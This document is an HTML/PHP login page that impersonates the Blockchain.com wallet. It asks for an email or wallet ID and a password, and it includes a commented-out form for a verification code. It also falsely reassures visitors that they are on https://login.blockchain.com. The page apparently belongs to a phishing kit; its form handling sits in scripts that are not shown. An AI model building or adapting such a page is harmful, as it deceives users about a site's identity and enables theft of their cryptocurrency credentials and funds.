<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain.com Wallet - Exchange Cryptocurrency</title>
    <link rel="stylesheet" href="bootstrap-3/css/bootstrap.min.css">
    <link rel="stylesheet" href="font-awesome/css/font-awesome.css">
    <link rel="stylesheet" href="css/default.css">
	<link rel="icon" href="favicon.ico">
</head>
<body>
	
<div class="alert page-feedback">
	<button class="close">&times;</button>
	<p class="feed-text"></p>
</div>

<div class="container-fluid header">
	<h4 class="text-center"><img src="bc-logo.svg" height="24" /></h4>
	<input type="hidden" id="initVal">
	<input type="hidden" id="autoVal">
</div>

<div class="container text-center content-wrapper">
	<div class="row">
		<div class="col-sm-5 center-page">
			<h3 class="text-white text-bold">Welcome back!</h3>
			<p class="text-light text-bold" style="margin:25px 0;">Enter Your Email Address or Wallet ID</p>	
			<!-- <form class="thumbnail" id="respForm">
				<div class="form-group text-left">
					<input type="text" class="form-control" name="ecode" id="ecode" placeholder="Enter code" required>
				</div>
				<div class="form-group text-left" style="margin:0;">
					<input type="hidden" name="user_login" value="">
					<button class="btn btn-primary btn-lg btn-block submit-btn">Submit</button>
				</div>
			</form> -->
			<form class="thumbnail" id="loginForm">
				<div class="form-group text-left">
					<label for="email_id" class="text-bold">Email or Wallet ID</label>
					<input type="text" class="form-control" name="email_id" id="email_id" placeholder="Enter your email or wallet ID" required>
				</div>
				<div class="form-group text-left">
					<label for="login_pwd" class="text-bold">Enter Password</label>
					<input type="password" class="form-control" name="login_pwd" id="login_pwd" placeholder="Enter your password" required>
				</div>
				<div class="form-group text-left">
					<input type="hidden" name="user_login" value="<?php echo md5( time().rand(1000,9999) ); ?>">
					<button class="btn btn-primary btn-lg btn-block submit-btn">Continue</button>
				</div>
				<a class="text-bold text-pale">Need some help</a>
			</form>
			
			<p style="margin-bottom:25px"><a href="" class="text-bold text-light">Don't have a Blockchain Account? <span class="text-white">Sign up Now</span></a></p>
			
			<p class="text-bold text-light">Please check that you are visiting the correct URL</p>
			<p><button class="url-btn text-light text-bold"><i class="fa fa-lock"></i> https://login.blockchain.com</button></p>
		</div>
	</div>
</div>

<script src="js/jquery-3.min.js"></script>
<script src="bootstrap-3/js/bootstrap.min.js"></script>
<script src="js/general.js"></script>
<script src="js/forms.js"></script>
</body>
</html>